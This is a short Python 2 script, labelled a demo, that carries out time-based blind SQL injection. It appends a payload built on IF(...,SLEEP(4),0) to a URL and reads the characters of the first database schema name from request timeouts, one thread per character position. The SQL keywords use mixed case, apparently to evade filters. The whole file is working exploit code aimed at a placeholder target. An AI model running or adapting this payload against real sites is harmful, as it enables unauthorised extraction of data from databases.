# blind sql exp demo

import threading,time
import requests

url = "aaa"
sql = "select SCHEMA_NAME frOm iNfOrmAtiOn_schEma.SCHEMATA limit 0,1"

def exp(n):
	global data
	#for i in range(33,127):
	for c in 'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ!@#$%&\()*+,-./0123456789:;<=>?@[\]^_`\'{|}~':
		i = ord(c)
		flag = 1
		payload = "%%27 or IF(ord(mid((%s),%d,1))=%d,SLEEP(4),0)%%23" % (sql, n, i)
		#print "(%d , %d)" % (n, i)
		try:
			res = requests.get(url+payload, timeout=3)
		#except requests.exceptions.Timeout,e:
		except:
			data[n] = chr(i)
			print "Data %dth: %s" % (n,data[n])
			flag = 0
			break

		# if key in res.contant:
		# 	data[n] = chr(i)
		# 	print "Data %dth: %s" % (n,data[n])
		# 	flag = 0
		
	if flag:
		exit()

def main():
	threadpool=[]

	for n in xrange(1,15):
		th = threading.Thread(target=exp,args= (n,))
		#th.setDaemon(True)
		threadpool.append(th)

	for th in threadpool:
		th.start()

	for th in threadpool :
		threading.Thread.join(th)

if __name__ == '__main__':
	data = {}
	start_time = time.time()
	main()
	print "Get data: ",data
	print "Spend time: ",time.time()-start_time